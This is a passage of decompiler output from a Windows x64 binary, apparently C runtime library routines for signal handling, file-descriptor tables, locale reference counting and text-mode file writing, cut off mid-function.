// 13F172B29: write access to const memory at 13F1C6A70 has been detected
// 13F1C6A70: using guessed type __int64 qword_13F1C6A70;

//----- (000000013F172B38) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char sub_13F172B38()
{
  qword_13F1C6A70 = 0i64;
  return 1;
}
// 13F172B38: write access to const memory at 13F1C6A70 has been detected
// 13F1C6A70: using guessed type __int64 qword_13F1C6A70;

//----- (000000013F172B44) ----------------------------------------------------
char __fastcall sub_13F172B44(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v5; // rbx
  _QWORD *v6; // rbx

  if ( a1 == a2 )
    return 1;
  v5 = a1;
  do
  {
    if ( *v5 && !((unsigned __int8 (__fastcall *)(_QWORD))*v5)(*v5) )
      break;
    v5 += 2;
  }
  while ( v5 != a2 );
  if ( v5 == a2 )
    return 1;
  if ( v5 != a1 )
  {
    v6 = v5 - 1;
    do
    {
      if ( *(v6 - 1) )
      {
        if ( *v6 )
          ((void (__fastcall *)(_QWORD))*v6)(0i64);
      }
      v6 -= 2;
    }
    while ( v6 + 1 != a1 );
  }
  return 0;
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);

//----- (000000013F172BD8) ----------------------------------------------------
char __fastcall sub_13F172BD8(void (__fastcall **a1)(_QWORD), void (__fastcall **a2)(_QWORD))
{
  void (__fastcall **v3)(_QWORD); // rbx

  if ( a1 != a2 )
  {
    v3 = a2 - 1;
    do
    {
      if ( *v3 )
        (*v3)(0i64);
      v3 -= 2;
    }
    while ( v3 + 1 != a1 );
  }
  return 1;
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);

//----- (000000013F172C28) ----------------------------------------------------
__int64 sub_13F172C28()
{
  sub_13F170628();
  sub_13F17067C();
  return __ROR8__(_security_cookie ^ 0x2CC5EF7154DEi64, _security_cookie & 0x3F);
}
// 13F1C6A88: using guessed type __int64 qword_13F1C6A88;

//----- (000000013F172C70) ----------------------------------------------------
__int64 sub_13F172C70()
{
  return sub_13F172C28();
}

//----- (000000013F172CA0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void __fastcall sub_13F172CA0(__int64 a1)
{
  qword_13F1C6A78 = a1;
  qword_13F1C6A80 = a1;
  qword_13F1C6A88 = a1;
  qword_13F1C6A90 = a1;
}
// 13F172CA0: write access to const memory at 13F1C6A78 has been detected
// 13F172CA7: write access to const memory at 13F1C6A80 has been detected
// 13F172CAE: write access to const memory at 13F1C6A88 has been detected
// 13F172CB5: write access to const memory at 13F1C6A90 has been detected
// 13F1C6A78: using guessed type __int64 qword_13F1C6A78;
// 13F1C6A80: using guessed type __int64 qword_13F1C6A80;
// 13F1C6A88: using guessed type __int64 qword_13F1C6A88;
// 13F1C6A90: using guessed type __int64 qword_13F1C6A90;

//----- (000000013F172CC0) ----------------------------------------------------
__int64 __fastcall sub_13F172CC0(unsigned int a1)
{
  _QWORD *v2; // r13
  char v3; // si
  _QWORD *v4; // rax
  __int64 i; // rcx
  __int64 *v7; // rbx
  unsigned int v8; // ecx
  unsigned int v9; // ecx
  unsigned int v10; // ecx
  unsigned int v11; // ecx
  void (__fastcall *v12)(_QWORD); // r15
  int v13; // er12
  __int64 v14; // rax
  __int64 v15; // rcx
  __int64 v16; // rbx
  int v17; // [rsp+90h] [rbp+18h]
  __int64 v18; // [rsp+98h] [rbp+20h]

  v2 = 0i64;
  v17 = 0;
  v3 = 1;
  if ( a1 != 2 )
  {
    switch ( a1 )
    {
      case 4u:
        goto LABEL_9;
      case 6u:
        goto LABEL_19;
      case 8u:
      case 0xBu:
LABEL_9:
        v4 = (_QWORD *)sub_13F16E5BC();
        v2 = v4;
        if ( !v4 )
          return 0xFFFFFFFFi64;
        for ( i = *v4; i != *v4 + 192i64; i += 16i64 )
        {
          if ( *(_DWORD *)(i + 4) == a1 )
            goto LABEL_16;
        }
        i = 0i64;
LABEL_16:
        if ( !i )
        {
LABEL_17:
          *(_DWORD *)sub_13F169DAC() = 22;
          sub_13F1682A0();
          return 0xFFFFFFFFi64;
        }
        v7 = (__int64 *)(i + 8);
        v3 = 0;
        goto LABEL_29;
    }
    if ( a1 != 15 && a1 - 21 > 1 )
      goto LABEL_17;
  }
LABEL_19:
  v8 = a1 - 2;
  if ( v8 )
  {
    v9 = v8 - 4;
    if ( !v9 )
    {
LABEL_25:
      v7 = &qword_13F1C6A88;
      goto LABEL_29;
    }
    v10 = v9 - 9;
    if ( v10 )
    {
      v11 = v10 - 6;
      if ( v11 )
      {
        if ( v11 != 1 )
        {
          v7 = 0i64;
          goto LABEL_29;
        }
        goto LABEL_25;
      }
      v7 = &qword_13F1C6A80;
    }
    else
    {
      v7 = &qword_13F1C6A90;
    }
  }
  else
  {
    v7 = &qword_13F1C6A78;
  }
LABEL_29:
  v18 = 0i64;
  if ( v3 )
    sub_13F170628();
  if ( v3 )
    v12 = (void (__fastcall *)(_QWORD))__ROR8__(*v7 ^ _security_cookie, _security_cookie & 0x3F);
  else
    v12 = (void (__fastcall *)(_QWORD))*v7;
  if ( v12 == (void (__fastcall *)(_QWORD))1 )
  {
    v13 = 2320;
    goto LABEL_49;
  }
  if ( !v12 )
  {
    if ( v3 )
      sub_13F17067C();
    sub_13F16A0FC(3u);
  }
  v13 = 2320;
  if ( a1 > 0xB || !_bittest(&v13, a1) )
    goto LABEL_43;
  v18 = v2[1];
  v2[1] = 0i64;
  if ( a1 == 8 )
  {
    v17 = *(_DWORD *)(sub_13F16E528() + 16);
    *(_DWORD *)(sub_13F16E528() + 16) = 140;
LABEL_43:
    if ( a1 == 8 )
    {
      v14 = *v2 + 48i64;
      v15 = *v2 + 192i64;
      while ( v14 != v15 )
      {
        *(_QWORD *)(v14 + 8) = 0i64;
        v14 += 16i64;
      }
      goto LABEL_49;
    }
  }
  *v7 = _security_cookie ^ __ROR8__(0i64, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
LABEL_49:
  if ( v3 )
    sub_13F17067C();
  if ( v12 != (void (__fastcall *)(_QWORD))1 )
  {
    if ( a1 == 8 )
    {
      v16 = sub_13F16E528();
      _guard_check_icall_fptr(v12);
      ((void (__fastcall *)(__int64, _QWORD))v12)(8i64, *(unsigned int *)(v16 + 16));
    }
    else
    {
      _guard_check_icall_fptr(v12);
      v12(a1);
    }
    if ( a1 <= 0xB && _bittest(&v13, a1) )
    {
      v2[1] = v18;
      if ( a1 == 8 )
        *(_DWORD *)(sub_13F16E528() + 16) = v17;
    }
  }
  return 0i64;
}
// 13F1024B0: using guessed type __int64 __fastcall guard_check_icall_nop();
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);
// 13F1C6A78: using guessed type __int64 qword_13F1C6A78;
// 13F1C6A80: using guessed type __int64 qword_13F1C6A80;
// 13F1C6A88: using guessed type __int64 qword_13F1C6A88;
// 13F1C6A90: using guessed type __int64 qword_13F1C6A90;

//----- (000000013F172F5C) ----------------------------------------------------
__int64 sub_13F172F5C()
{
  __int64 v0; // rax
  __int64 v1; // rsi
  __int64 v2; // rbx
  __int64 v3; // rbp
  __int64 v4; // rdi

  v0 = sub_13F16E6BC(0x40ui64, 0x40ui64);
  v1 = 0i64;
  v2 = v0;
  if ( v0 )
  {
    v3 = v0 + 4096;
    if ( v0 != v0 + 4096 )
    {
      v4 = v0 + 48;
      do
      {
        sub_13F16EBCC(v4 - 48, 0xFA0u, 0);
        *(_QWORD *)(v4 - 8) = -1i64;
        *(_QWORD *)v4 = 0i64;
        *(_DWORD *)(v4 + 8) = 168427520;
        *(_BYTE *)(v4 + 12) = 10;
        *(_BYTE *)(v4 + 13) &= 0xF8u;
        *(_BYTE *)(v4 + 14) = 0;
        v4 += 64i64;
      }
      while ( v4 - 48 != v3 );
    }
    v1 = v2;
  }
  sub_13F16E734(0i64);
  return v1;
}

//----- (000000013F172FF4) ----------------------------------------------------
void __fastcall sub_13F172FF4(__int64 a1)
{
  __int64 v1; // rsi
  __int64 i; // rdi

  if ( a1 )
  {
    v1 = a1 + 4096;
    for ( i = a1; i != v1; i += 64i64 )
      MEMORY[0x771B38F0](i);
    sub_13F16E734(a1);
  }
}

//----- (000000013F173044) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F173044(unsigned int a1)
{
  unsigned int v2; // ebx
  __int64 v4; // rdi
  int v5; // eax
  __int64 v6; // rax

  v2 = 0;
  if ( a1 < 0x2000 )
  {
    sub_13F170628();
    v4 = 0i64;
    v5 = 64;
    while ( (int)a1 >= v5 )
    {
      if ( !qword_13F1C6400[v4] )
      {
        v6 = sub_13F172F5C();
        qword_13F1C6400[v4] = v6;
        if ( !v6 )
        {
          v2 = 12;
          break;
        }
        v5 = 128;
        dword_13F1C6800 = 128;
      }
      ++v4;
    }
    sub_13F17067C();
  }
  else
  {
    v2 = 9;
    *(_DWORD *)sub_13F169DAC() = 9;
    sub_13F1682A0();
  }
  return v2;
}
// 13F1730C9: write access to const memory at 13F1C6800 has been detected
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];
// 13F1C6800: using guessed type int dword_13F1C6800;

//----- (000000013F1730FC) ----------------------------------------------------
void sub_13F1730FC()
{
  JUMPOUT(0x771DD7F0i64);
}
// 13F173118: control flows out of bounds to 771DD7F0

//----- (000000013F173120) ----------------------------------------------------
void sub_13F173120()
{
  JUMPOUT(0x771DD830i64);
}
// 13F17313C: control flows out of bounds to 771DD830

//----- (000000013F173144) ----------------------------------------------------
__int64 __fastcall sub_13F173144(int a1)
{
  __int64 v2; // rsi
  unsigned __int64 v3; // rdi
  __int64 v4; // rax
  int v5; // ebx
  __int64 v6; // rcx

  if ( a1 >= 0 && (unsigned int)a1 < 0x40 )
  {
    v2 = (__int64)a1 >> 6;
    v3 = (unsigned __int64)(a1 & 0x3F) << 6;
    v4 = qword_13F1C6400[v2];
    if ( (*(_BYTE *)(v4 + v3 + 56) & 1) != 0 && *(_QWORD *)(v4 + v3 + 40) != -1i64 )
    {
      if ( (unsigned int)sub_13F16D11C() == 1 )
      {
        if ( !a1 )
        {
          v6 = 4294967286i64;
          goto LABEL_12;
        }
        v5 = a1 - 1;
        if ( !v5 )
        {
          v6 = 4294967285i64;
          goto LABEL_12;
        }
        if ( v5 == 1 )
        {
          v6 = 4294967284i64;
LABEL_12:
          MEMORY[0x76FBC180](v6, 0i64);
        }
      }
      *(_QWORD *)(qword_13F1C6400[v2] + v3 + 40) = -1i64;
      return 0i64;
    }
  }
  *(_DWORD *)sub_13F169DAC() = 9;
  *sub_13F169D8C() = 0;
  return 0xFFFFFFFFi64;
}
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];

//----- (000000013F173200) ----------------------------------------------------
__int64 __fastcall sub_13F173200(int a1)
{
  unsigned __int64 v1; // rdx
  __int64 v2; // rax

  if ( a1 == -2 )
  {
    *sub_13F169D8C() = 0;
    *(_DWORD *)sub_13F169DAC() = 9;
  }
  else
  {
    if ( a1 >= 0 && (unsigned int)a1 < 0x40 )
    {
      v1 = (unsigned __int64)(a1 & 0x3F) << 6;
      v2 = qword_13F1C6400[(__int64)a1 >> 6];
      if ( (*(_BYTE *)(v2 + v1 + 56) & 1) != 0 )
        return *(_QWORD *)(v2 + v1 + 40);
    }
    *sub_13F169D8C() = 0;
    *(_DWORD *)sub_13F169DAC() = 9;
    sub_13F1682A0();
  }
  return -1i64;
}
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];

//----- (000000013F173278) ----------------------------------------------------
void __fastcall sub_13F173278(_QWORD *a1)
{
  char *v2; // rcx
  char *v3; // rcx
  char *v4; // rcx
  char *v5; // rcx
  char *v6; // rcx
  char *v7; // rcx
  char *v8; // rcx
  int *v9; // rcx
  int *v10; // rcx
  int *v11; // rcx
  int *v12; // rcx
  int *v13; // rcx
  int *v14; // rcx

  if ( a1 )
  {
    v2 = (char *)a1[3];
    if ( v2 != byte_13F1C6079 )
      sub_13F16E734((__int64)v2);
    v3 = (char *)a1[4];
    if ( v3 != byte_13F1C6079 )
      sub_13F16E734((__int64)v3);
    v4 = (char *)a1[5];
    if ( v4 != byte_13F1C6079 )
      sub_13F16E734((__int64)v4);
    v5 = (char *)a1[6];
    if ( v5 != byte_13F1C6079 )
      sub_13F16E734((__int64)v5);
    v6 = (char *)a1[7];
    if ( v6 != byte_13F1C6079 )
      sub_13F16E734((__int64)v6);
    v7 = (char *)a1[8];
    if ( v7 != byte_13F1C6079 )
      sub_13F16E734((__int64)v7);
    v8 = (char *)a1[9];
    if ( v8 != byte_13F1C6079 )
      sub_13F16E734((__int64)v8);
    v9 = (int *)a1[13];
    if ( v9 != &dword_13F1C607C )
      sub_13F16E734((__int64)v9);
    v10 = (int *)a1[14];
    if ( v10 != &dword_13F1C607C )
      sub_13F16E734((__int64)v10);
    v11 = (int *)a1[15];
    if ( v11 != &dword_13F1C607C )
      sub_13F16E734((__int64)v11);
    v12 = (int *)a1[16];
    if ( v12 != &dword_13F1C607C )
      sub_13F16E734((__int64)v12);
    v13 = (int *)a1[17];
    if ( v13 != &dword_13F1C607C )
      sub_13F16E734((__int64)v13);
    v14 = (int *)a1[18];
    if ( v14 != &dword_13F1C607C )
      sub_13F16E734((__int64)v14);
  }
}
// 13F1C607C: using guessed type int dword_13F1C607C;

//----- (000000013F173384) ----------------------------------------------------
void __fastcall sub_13F173384(__int64 a1)
{
  char *v2; // rcx
  char *v3; // rcx
  char *v4; // rcx
  int *v5; // rcx
  int *v6; // rcx

  if ( a1 )
  {
    v2 = *(char **)a1;
    if ( v2 != byte_13F1B7498 )
      sub_13F16E734((__int64)v2);
    v3 = *(char **)(a1 + 8);
    if ( v3 != byte_13F1C6079 )
      sub_13F16E734((__int64)v3);
    v4 = *(char **)(a1 + 16);
    if ( v4 != byte_13F1C6079 )
      sub_13F16E734((__int64)v4);
    v5 = *(int **)(a1 + 88);
    if ( v5 != &dword_13F1B749C )
      sub_13F16E734((__int64)v5);
    v6 = *(int **)(a1 + 96);
    if ( v6 != &dword_13F1C607C )
      sub_13F16E734((__int64)v6);
  }
}
// 13F1B749C: using guessed type int dword_13F1B749C;
// 13F1C607C: using guessed type int dword_13F1C607C;

//----- (000000013F1733F0) ----------------------------------------------------
void __fastcall sub_13F1733F0(unsigned __int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 *v3; // rbx
  unsigned __int64 v4; // rsi

  v2 = 0i64;
  v3 = (__int64 *)a1;
  v4 = (unsigned __int64)(8 * a2 + 7) >> 3;
  if ( a1 > a1 + 8 * a2 )
    v4 = 0i64;
  if ( v4 )
  {
    do
    {
      sub_13F16E734(*v3);
      ++v2;
      ++v3;
    }
    while ( v2 != v4 );
  }
}

//----- (000000013F173448) ----------------------------------------------------
void __fastcall sub_13F173448(__int64 *a1)
{
  if ( a1 )
  {
    sub_13F1733F0((unsigned __int64)a1, 7i64);
    sub_13F1733F0((unsigned __int64)(a1 + 7), 7i64);
    sub_13F1733F0((unsigned __int64)(a1 + 14), 12i64);
    sub_13F1733F0((unsigned __int64)(a1 + 26), 12i64);
    sub_13F1733F0((unsigned __int64)(a1 + 38), 2i64);
    sub_13F16E734(a1[40]);
    sub_13F16E734(a1[41]);
    sub_13F16E734(a1[42]);
    sub_13F1733F0((unsigned __int64)(a1 + 44), 7i64);
    sub_13F1733F0((unsigned __int64)(a1 + 51), 7i64);
    sub_13F1733F0((unsigned __int64)(a1 + 58), 12i64);
    sub_13F1733F0((unsigned __int64)(a1 + 70), 12i64);
    sub_13F1733F0((unsigned __int64)(a1 + 82), 2i64);
    sub_13F16E734(a1[84]);
    sub_13F16E734(a1[85]);
    sub_13F16E734(a1[86]);
    sub_13F16E734(a1[87]);
  }
}

//----- (000000013F173550) ----------------------------------------------------
__int64 __fastcall sub_13F173550(
        __int128 *a1,
        unsigned int a2,
        __int64 a3,
        unsigned int a4,
        __int64 a5,
        unsigned int a6,
        int a7)
{
  unsigned int v10; // esi
  int v11; // eax
  __int64 v12; // r14
  unsigned int v13; // edi
  unsigned __int64 v14; // rdi
  unsigned __int64 v15; // rax
  unsigned __int64 v16; // rcx
  __int64 v17; // rax
  void *v18; // rsp
  __int64 *v19; // rbx
  __int64 *v20; // rax
  unsigned int v21; // eax
  __int64 v23; // [rsp+0h] [rbp-30h] BYREF
  __int64 v24[3]; // [rsp+30h] [rbp+0h] BYREF
  char v25; // [rsp+48h] [rbp+18h]

  sub_13F1687CC((__int64)v24, a1);
  v10 = a6;
  if ( !a6 )
    v10 = *(_DWORD *)(v24[1] + 12);
  v11 = MEMORY[0x76F84FF0](v10, a7 != 0 ? 9 : 1, a3, a4, 0i64, 0);
  v12 = v11;
  if ( !v11 )
  {
    v13 = 0;
    goto LABEL_22;
  }
  v14 = 2i64 * v11;
  if ( (-(__int64)(v14 < v14 + 16) & (v14 + 16)) == 0 )
  {
    v19 = 0i64;
    goto LABEL_15;
  }
  v15 = v14 + 16;
  if ( ((v14 + 16) & -(__int64)(v14 < v14 + 16)) <= 0x400 )
  {
    v16 = v15 & -(__int64)(v14 < v15);
    v17 = v16 + 15;
    if ( v16 + 15 <= v16 )
      v17 = 0xFFFFFFFFFFFFFF0i64;
    v18 = alloca(v17 & 0xFFFFFFFFFFFFFFF0ui64);
    v19 = v24;
    if ( &v23 == (__int64 *)-48i64 )
      goto LABEL_18;
    LODWORD(v24[0]) = 52428;
    goto LABEL_13;
  }
  v20 = (__int64 *)sub_13F16F1F8(v15 & -(__int64)(v14 < v15));
  v19 = v20;
  if ( v20 )
  {
    *(_DWORD *)v20 = 56797;
LABEL_13:
    v19 += 2;
  }
LABEL_15:
  if ( !v19 || (sub_13F15EF70((__int64)v19, 0, 2 * v12), (v21 = MEMORY[0x76F84FF0](v10, 1i64, a3, a4, v19, v12)) == 0) )
  {
LABEL_18:
    v13 = 0;
    goto LABEL_19;
  }
  v13 = MEMORY[0x76F88510](a2, v19, v21, a5);
LABEL_19:
  if ( v19 && *((_DWORD *)v19 - 4) == 56797 )
    sub_13F16E734((__int64)(v19 - 2));
LABEL_22:
  if ( v25 )
    *(_DWORD *)(v24[0] + 936) &= ~2u;
  return v13;
}

//----- (000000013F173704) ----------------------------------------------------
__int64 __fastcall sub_13F173704(__int64 a1)
{
  volatile signed __int32 *v1; // rax
  volatile signed __int32 *v2; // rax
  volatile signed __int32 *v3; // rax
  volatile signed __int32 *v4; // rax
  volatile signed __int32 **v5; // rax
  __int64 v6; // r8
  volatile signed __int32 *v7; // rdx
  __int64 v8; // rcx

  _InterlockedIncrement((volatile signed __int32 *)(a1 + 16));
  v1 = *(volatile signed __int32 **)(a1 + 224);
  if ( v1 )
    _InterlockedIncrement(v1);
  v2 = *(volatile signed __int32 **)(a1 + 240);
  if ( v2 )
    _InterlockedIncrement(v2);
  v3 = *(volatile signed __int32 **)(a1 + 232);
  if ( v3 )
    _InterlockedIncrement(v3);
  v4 = *(volatile signed __int32 **)(a1 + 256);
  if ( v4 )
    _InterlockedIncrement(v4);
  v5 = (volatile signed __int32 **)(a1 + 56);
  v6 = 6i64;
  do
  {
    if ( *(v5 - 2) != (volatile signed __int32 *)byte_13F1B7618 && *v5 )
      _InterlockedIncrement(*v5);
    if ( *(v5 - 3) )
    {
      v7 = *(v5 - 1);
      if ( v7 )
        _InterlockedIncrement(v7);
    }
    v5 += 4;
    --v6;
  }
  while ( v6 );
  v8 = *(_QWORD *)(a1 + 288);
  if ( !v8 || (__int64 *)v8 == qword_13F18F9B0 )
    return 0x7FFFFFFFi64;
  else
    return (unsigned int)_InterlockedIncrement((volatile signed __int32 *)(v8 + 348));
}
// 13F18F9B0: using guessed type __int64 qword_13F18F9B0[121];

//----- (000000013F173790) ----------------------------------------------------
void __fastcall sub_13F173790(__int64 *a1)
{
  char (**v1)[4]; // rax
  _DWORD *v3; // rax
  _DWORD *v4; // rcx
  _DWORD *v5; // rcx
  _DWORD *v6; // rax
  __int64 *v7; // rsi
  __int64 v8; // rbp
  __int64 *v9; // rdi
  _DWORD *v10; // rcx
  _DWORD *v11; // rcx

  v1 = (char (**)[4])a1[31];
  if ( v1 )
  {
    if ( v1 != &off_13F1B7400 )
    {
      v3 = (_DWORD *)a1[28];
      if ( v3 )
      {
        if ( !*v3 )
        {
          v4 = (_DWORD *)a1[30];
          if ( v4 && !*v4 )
          {
            sub_13F16E734((__int64)v4);
            sub_13F173278((_QWORD *)a1[31]);
          }
          v5 = (_DWORD *)a1[29];
          if ( v5 && !*v5 )
          {
            sub_13F16E734((__int64)v5);
            sub_13F173384(a1[31]);
          }
          sub_13F16E734(a1[28]);
          sub_13F16E734(a1[31]);
        }
      }
    }
  }
  v6 = (_DWORD *)a1[32];
  if ( v6 && !*v6 )
  {
    sub_13F16E734(a1[33] - 254);
    sub_13F16E734(a1[34] - 128);
    sub_13F16E734(a1[35] - 128);
    sub_13F16E734(a1[32]);
  }
  sub_13F173930(a1[36]);
  v7 = a1 + 37;
  v8 = 6i64;
  v9 = a1 + 7;
  do
  {
    if ( (char *)*(v9 - 2) != byte_13F1B7618 )
    {
      v10 = (_DWORD *)*v9;
      if ( *v9 )
      {
        if ( !*v10 )
        {
          sub_13F16E734((__int64)v10);
          sub_13F16E734(*v7);
        }
      }
    }
    if ( *(v9 - 3) )
    {
      v11 = (_DWORD *)*(v9 - 1);
      if ( v11 )
      {
        if ( !*v11 )
          sub_13F16E734((__int64)v11);
      }
    }
    ++v7;
    v9 += 4;
    --v8;
  }
  while ( v8 );
  sub_13F16E734((__int64)a1);
}
// 13F1B7400: using guessed type char (*off_13F1B7400)[4];

//----- (000000013F173930) ----------------------------------------------------
void __fastcall sub_13F173930(__int64 a1)
{
  if ( a1 && (__int64 *)a1 != qword_13F18F9B0 && !*(_DWORD *)(a1 + 348) )
  {
    sub_13F173448((__int64 *)a1);
    sub_13F16E734(a1);
  }
}
// 13F18F9B0: using guessed type __int64 qword_13F18F9B0[121];

//----- (000000013F173968) ----------------------------------------------------
__int64 __fastcall sub_13F173968(__int64 a1)
{
  if ( !a1 || (__int64 *)a1 == qword_13F18F9B0 )
    return 0x7FFFFFFFi64;
  else
    return (unsigned int)_InterlockedDecrement((volatile signed __int32 *)(a1 + 348));
}
// 13F18F9B0: using guessed type __int64 qword_13F18F9B0[121];

//----- (000000013F173990) ----------------------------------------------------
void __fastcall sub_13F173990(__int64 a1)
{
  volatile signed __int32 *v1; // rax
  volatile signed __int32 *v2; // rax
  volatile signed __int32 *v3; // rax
  volatile signed __int32 *v4; // rax
  volatile signed __int32 **v5; // rax
  __int64 v6; // r8
  volatile signed __int32 *v7; // rdx

  if ( a1 )
  {
    _InterlockedAdd((volatile signed __int32 *)(a1 + 16), 0xFFFFFFFF);
    v1 = *(volatile signed __int32 **)(a1 + 224);
    if ( v1 )
      _InterlockedAdd(v1, 0xFFFFFFFF);
    v2 = *(volatile signed __int32 **)(a1 + 240);
    if ( v2 )
      _InterlockedAdd(v2, 0xFFFFFFFF);
    v3 = *(volatile signed __int32 **)(a1 + 232);
    if ( v3 )
      _InterlockedAdd(v3, 0xFFFFFFFF);
    v4 = *(volatile signed __int32 **)(a1 + 256);
    if ( v4 )
      _InterlockedAdd(v4, 0xFFFFFFFF);
    v5 = (volatile signed __int32 **)(a1 + 56);
    v6 = 6i64;
    do
    {
      if ( *(v5 - 2) != (volatile signed __int32 *)byte_13F1B7618 && *v5 )
        _InterlockedAdd(*v5, 0xFFFFFFFF);
      if ( *(v5 - 3) )
      {
        v7 = *(v5 - 1);
        if ( v7 )
          _InterlockedAdd(v7, 0xFFFFFFFF);
      }
      v5 += 4;
      --v6;
    }
    while ( v6 );
    sub_13F173968(*(_QWORD *)(a1 + 288));
  }
}

//----- (000000013F173A38) ----------------------------------------------------
__int64 sub_13F173A38()
{
  __int64 v0; // rax
  __int64 v1; // rdi
  __int64 v2; // rbx

  v0 = sub_13F16E528();
  v1 = v0;
  if ( (*(_DWORD *)(v0 + 936) & 0xFFFFFFFE) == 0 || (v2 = *(_QWORD *)(v0 + 144)) == 0 )
  {
    sub_13F170628();
    v2 = sub_13F173AA8((__int64 *)(v1 + 144), (__int64)&off_13F1B74B0);
    sub_13F17067C();
    if ( !v2 )
      sub_13F16DDAC();
  }
  return v2;
}
// 13F1B74B0: using guessed type wchar_t *off_13F1B74B0;
// 13F1C6820: using guessed type wchar_t **off_13F1C6820;

//----- (000000013F173AA8) ----------------------------------------------------
__int64 __fastcall sub_13F173AA8(__int64 *a1, __int64 a2)
{
  __int64 v3; // rbx

  if ( !a2 || !a1 )
    return 0i64;
  v3 = *a1;
  if ( *a1 == a2 )
    return a2;
  *a1 = a2;
  sub_13F173704(a2);
  if ( v3 )
  {
    sub_13F173990(v3);
    if ( !*(_DWORD *)(v3 + 16) && (wchar_t **)v3 != &off_13F1B74B0 )
      sub_13F173790((__int64 *)v3);
  }
  return a2;
}
// 13F1B74B0: using guessed type wchar_t *off_13F1B74B0;

//----- (000000013F173B10) ----------------------------------------------------
__int64 __fastcall sub_13F173B10(__int64 a1, __int64 a2, int **a3)
{
  __int64 v4; // rax
  unsigned int v5; // ebx
  int *v6; // rbx

  sub_13F1730FC();
  if ( (*(_BYTE *)(qword_13F1C6400[(__int64)**a3 >> 6] + ((unsigned __int64)(**a3 & 0x3F) << 6) + 56) & 1) == 0 )
    goto LABEL_4;
  v4 = sub_13F173200(**a3);
  v5 = 0;
  if ( !(unsigned int)MEMORY[0x76F760E0](v4) )
  {
    v6 = sub_13F169D8C();
    *v6 = MEMORY[0x76F91760]();
LABEL_4:
    *(_DWORD *)sub_13F169DAC() = 9;
    v5 = -1;
  }
  sub_13F173120();
  return v5;
}
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];

//----- (000000013F173B9C) ----------------------------------------------------
__int64 __fastcall sub_13F173B9C(int a1)
{
  int *v2; // [rsp+20h] [rbp-18h] BYREF
  int v3; // [rsp+40h] [rbp+8h] BYREF
  char v4; // [rsp+48h] [rbp+10h] BYREF
  int v5; // [rsp+50h] [rbp+18h]
  int v6; // [rsp+58h] [rbp+20h] BYREF

  v3 = a1;
  if ( a1 == -2 )
  {
    *(_DWORD *)sub_13F169DAC() = 9;
  }
  else
  {
    if ( a1 >= 0
      && (unsigned int)a1 < 0x40
      && (*(_BYTE *)(qword_13F1C6400[(__int64)a1 >> 6] + ((unsigned __int64)(a1 & 0x3F) << 6) + 56) & 1) != 0 )
    {
      v5 = a1;
      v6 = a1;
      v2 = &v3;
      return sub_13F173B10((__int64)&v4, (__int64)&v6, &v2);
    }
    *(_DWORD *)sub_13F169DAC() = 9;
    sub_13F1682A0();
  }
  return 0xFFFFFFFFi64;
}
// 13F1C6400: using guessed type __int64 qword_13F1C6400[];

//----- (000000013F173C30) ----------------------------------------------------
__int64 __fastcall sub_13F173C30(__int64 a1, int a2, unsigned __int64 a3, unsigned int a4)
{
  __int64 v4; // r15
  unsigned __int64 v5; // rsi
  unsigned __int64 v8; // r12
  unsigned __int8 *v9; // rdi
  bool i; // cf
  char v11; // r13
  __int64 v12; // rdx
  char v13; // cl
  char v14; // al
  unsigned __int64 v15; // r8
  unsigned __int8 *v16; // rdx
  unsigned int v17; // eax
  unsigned int v18; // er14
  __int64 v19; // rcx
  __int16 v21[2]; // [rsp+40h] [rbp-40h] BYREF
  __int16 v22; // [rsp+44h] [rbp-3Ch] BYREF
  unsigned int v23; // [rsp+48h] [rbp-38h] BYREF
  unsigned int v24; // [rsp+4Ch] [rbp-34h]
  __int64 v25; // [rsp+50h] [rbp-30h]
  unsigned __int64 v26; // [rsp+58h] [rbp-28h]
  char v27[8]; // [rsp+60h] [rbp-20h] BYREF
  char v28[8]; // [rsp+68h] [rbp-18h] BYREF

  v4 = (__int64)a2 >> 6;
  v5 = (unsigned __int64)(a2 & 0x3F) << 6;
  v26 = a3;
  v8 = a3 + a4;
  v25 = *(_QWORD *)(qword_13F1C6400[v4] + v5 + 40);
  v24 = MEMORY[0x76FB09F0]();
  *(_QWORD *)a1 = 0i64;
  v9 = (unsigned __int8 *)a3;
  *(_DWORD *)(a1 + 8) = 0;
  for ( i = a3 < v8; i; i = (unsigned __int64)v9 < v8 )
  {
    v11 = *v9;
    v21[0] = 0;
    v12 = qword_13F1C6400[v4];
    v13 = *(_BYTE *)(v12 + v5 + 61);
    if ( (v13 & 4) != 0 )
    {
      v14 = *(_BYTE *)(v12 + v5 + 62);
      *(_BYTE *)(v12 + v5 + 61) = v13 & 0xFB;
      v15 = 2i64;
      v16 = (unsigned __int8 *)v27;
      v27[0] = v14;
      v27[1] = v11;
      goto LABEL_10;
    }
    if ( *(__int16 *)(sub_13F170B50() + 2i64 * *v9) >= 0 )
    {
      v15 = 1i64;
      v16 = v9;
LABEL_10:
      if ( (unsigned int)sub_13F16F3D0(v21, v16, v15) == -1 )
        return a1;
      goto LABEL_11;
    }
    if ( (unsigned __int64)v9 >= v8 )
    {
      *(_BYTE *)(qword_13F1C6400[v4] + v5 + 62) = *v9;
      *(_BYTE *)(qword_13F1C6400[v4] + v5 + 61) |= 4u;
      ++*(_DWORD *)(a1 + 4);
      return a1;
    }
    if ( (unsigned int)sub_13F16F3D0(v21, v9, 2ui64) == -1 )
      return a1;
    ++v9;
LABEL_11:
    ++v9;
    v17 = MEMORY[0x76F91F80](v24, 0i64, v21, 1i64, v28, 5, 0i64, 0i64);
    v18 = v17;
    if ( !v17 )
      return a1;
    if ( !(unsigned int)MEMORY[0x76F91F30](v25, v28, v17, &v23, 0i64) )
    {
LABEL_20:
      *(_DWORD *)a1 = MEMORY[0x76F91760](v19, 0i64);
      return a1;
    }
    *(_DWORD *)(a1 + 4) = (_DWORD)v9 + *(_DWORD *)(a1 + 8) - v26;
    if ( v23 < v18 )
      return a1;
    if ( v11 == 10 )
